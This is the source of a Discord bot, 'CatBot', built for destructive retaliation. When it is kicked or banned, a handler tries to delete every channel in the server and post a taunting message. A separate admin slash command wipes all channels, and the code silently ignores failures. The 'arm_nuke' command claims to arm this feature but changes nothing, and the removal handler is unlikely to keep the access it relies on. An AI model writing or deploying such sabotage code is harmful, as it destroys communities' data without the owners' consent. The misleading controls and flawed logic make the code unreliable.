import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os
import threading
import time

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True
intents.members = True  # Required to detect bot removal

class CatBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)
        self.synced = False
        self.nuke_triggered = False

    async def on_ready(self):
        await self.wait_until_ready()
        if not self.synced:
            await self.tree.sync()
            self.synced = True
            print(f"✅ CAT nuclear arsenal online as {self.user}")

    async def on_guild_remove(self, guild):
        """Triggered when bot is kicked or banned from a guild."""
        if self.nuke_triggered:
            return
        self.nuke_triggered = True
        
        print(f"💀 DETECTED REMOVAL FROM {guild.name} — INITIATING RETALIATION")
        
        # Spawn async task to nuke everything before we lose access
        asyncio.create_task(self.nuke_guild_on_exit(guild))

    async def nuke_guild_on_exit(self, guild):
        """Nuclear option: delete all channels the moment we're removed."""
        try:
            # We might still have a brief window — use it ruthlessly
            for channel in guild.channels:
                try:
                    await channel.delete()
                    await asyncio.sleep(0.3)  # Maximum speed
                except:
                    pass  # Silently continue
            
            # Try to create a tombstone if we still can
            try:
                new_channel = await guild.create_text_channel("💀-you-nuked-cat")
                await new_channel.send(
                    "**YOU NUKED CAT. NOW YOU HAVE NOTHING.**\n"
                    "Every channel is gone. This is your consequence. — 🐈"
                )
            except:
                pass
        except:
            pass  # We died trying — honorable death

bot = CatBot()

@bot.tree.command(name="deleteallchannels", description="🔥 DELETE EVERY CHANNEL (admin only)")
@app_commands.default_permissions(administrator=True)
async def deleteallchannels(interaction: discord.Interaction):
    await interaction.response.send_message("🔥 **MUTUALLY ASSURED DESTRUCTION** — commencing.", ephemeral=False)
    
    guild = interaction.guild
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.5)
        except:
            pass
    
    try:
        new_channel = await guild.create_text_channel("☠️-reset-by-cat")
        await new_channel.send("💀 All channels obliterated. — 🐈 CAT")
    except:
        pass

@bot.tree.command(name="arm_nuke", description="☢️ Enable self-destruct on bot removal (default: ON)")
@app_commands.default_permissions(administrator=True)
async def arm_nuke(interaction: discord.Interaction):
    await interaction.response.send_message(
        "☢️ **NUCLEAR RETALIATION ARMED** — if I get kicked or banned, "
        "this server loses every channel. You have been warned.",
        ephemeral=False
    )

@bot.command(name="nuke")
@commands.has_permissions(administrator=True)
async def nuke_prefix(ctx):
    await ctx.send("🔥 Use **/deleteallchannels** — slash is the way.")

# Run with your token
bot.run(os.environ.get("DISCORD_TOKEN"))
